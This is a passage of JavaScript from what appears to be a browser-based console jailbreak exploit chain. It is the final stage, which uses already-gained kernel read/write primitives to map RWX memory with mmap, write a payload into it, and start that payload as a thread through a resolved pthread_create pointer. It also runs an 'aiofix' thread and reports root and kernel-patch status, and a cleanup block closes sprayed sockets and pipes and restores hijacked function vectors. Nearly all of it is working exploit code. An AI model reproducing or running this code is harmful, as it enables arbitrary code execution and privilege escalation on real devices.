                    if (aBad < 0 && off.wk___imp_pthread_create !== undefined) {
                        const slot = webkitBase.add32(off.wk___imp_pthread_create);
                        const fn = p.read8(slot);
                        const expect = libkernelBase.add32(off.k_pthread_create);
                        if (fn.low === expect.low && fn.hi === expect.hi) {
                            const aThr = new ArrayBuffer(8); keepAlive.push(aThr);
                            const aThrAddr = bufAddr(aThr);
                            new Uint8Array(aThr).fill(0);
                            const aRc = callAddr(expect, [aThrAddr, 0, aEntry, 0]).i32;
                            const aHandle = new int64(new DataView(aThr).getUint32(0, true), new DataView(aThr).getUint32(4, true));
                            aiofixRan = aRc === 0 && aHandle.hi > 0;
                            mark("AIOFIX-RUNNING", "rc=" + aRc);
                            nanosleepMs(1500);
                        }
                    }
                }
            }
            if (payload) {
                state("payload...", "warn");
                const sz = (payload.length + 0x3fff) & ~0x3fff;
                const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                const entry = new int64(m.lo, m.hi);
                mark("PAYLOAD-MAP", "rwx=" + entry);
                if (entry.hi > 0) {
                    for (let i = 0; i < payload.length; ++i) p.write1(entry.add32(i), payload[i]);
                    let bad = -1;
                    for (let i = 0; i < payload.length; ++i) if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
                    if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
                        const slot = webkitBase.add32(off.wk___imp_pthread_create);
                        const fn = p.read8(slot);
                        const expect = libkernelBase.add32(off.k_pthread_create);
                        if (fn.low === expect.low && fn.hi === expect.hi) {
                            const thr = new ArrayBuffer(8); keepAlive.push(thr);
                            const thrAddr = bufAddr(thr);
                            new Uint8Array(thr).fill(0);
                            const rc = callAddr(expect, [thrAddr, 0, entry, 0]).i32;
                            const handle = new int64(new DataView(thr).getUint32(0, true), new DataView(thr).getUint32(4, true));
                            payloadRunning = rc === 0 && handle.hi > 0;
                            mark("PTHREAD-CREATE", "rc=" + rc + " handle=" + handle);
                            check("payload-thread-created", payloadRunning, "");
                            if (payloadRunning) mark("PAYLOAD-RUNNING", "bytes=" + payload.length + " entry=" + entry + " aiofix=" + aiofixRan);
                        }
                    }
                }
            }
        }

        mark("STEP10-CHAIN", "kv=up jb=" + jailbroken + " kp=" + kpatched + " af=" + aiofixRan + " pl=" + payloadRunning);
        if (payloadRunning) { allDone = true; mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=1"); }
        else if (kpatched) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=0");
        else if (jailbroken) mark("SAFE-TO-EXIT", "karw=1 root=1");
        else mark("SAFE-TO-EXIT", "karw=1 only");

        mark("STEP10-SUMMARY-FINAL", "karw_attempts=" + karwAttempt
            + " kernel_base=" + (kernelBase || "none")
            + " kv=" + (kv ? "up" : "down"));

        state(allDone ? "BERHASIL -- Tekan tombol PS"
              : kv ? "KERNEL R/W OK"
              : "make_karw falló",
              allDone ? "ok" : kv ? "warn" : "bad");
    } catch (e) {
        mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
        state("FAILED", "bad");
    } finally {
        if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
        try {
            if (sc) {
                const closeAll = (list, tag) => {
                    if (!list) return;
                    let n = 0;
                    for (const fd of list) { if (typeof fd !== "number" || fd <= 2) continue; try { if (sc(SYS.close, fd).i32 === 0) n++; } catch (_) { } }
                    if (n) mark(tag, "closed=" + n);
                };
                try { closeAll(_ipv6, "IPV6-CLOSED"); } catch (_) { }
                try { closeAll(_iovSs, "IOVSS-CLOSED"); } catch (_) { }
                try { closeAll(_uioSs, "UIOSS-CLOSED"); } catch (_) { }
                try { closeAll(_masterPipe, "MPIPE-CLOSED"); } catch (_) { }
                try { closeAll(_slavePipe, "SPIPE-CLOSED"); } catch (_) { }
                try { if (uafSock) { sc(SYS.close, uafSock); uafSock = 0; } } catch (_) { }
            }
        } catch (e) { mark("FD-CLEANUP-FAILED", e.message); }

        try { if (restoreCtx) await restoreCtx.restore("finally"); } catch (e) { mark("THREAD-ATTRS-THREW", e.message); }
        for (const w of workers) { try { if (w.armed) { await w.rpc("disarm", 3000); w.armed = false; } } catch (e) { } }
        for (const w of workers) { try { if (w.wired && w.master && w.origVector && p) { p.write8(w.master.add32(0x10), w.origVector); w.wired = false; } } catch (e) { } }
        for (const w of workers) { try { w.worker.terminate(); } catch (e) { } }
        try { if (mainArmed && mainMf && mainOrig && p) { p.write8(mainMf, mainOrig); mainArmed = false; mark("EXPM1-RESTORED", "" + Math.expm1(1)); } } catch (e) { }

        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
    }
})();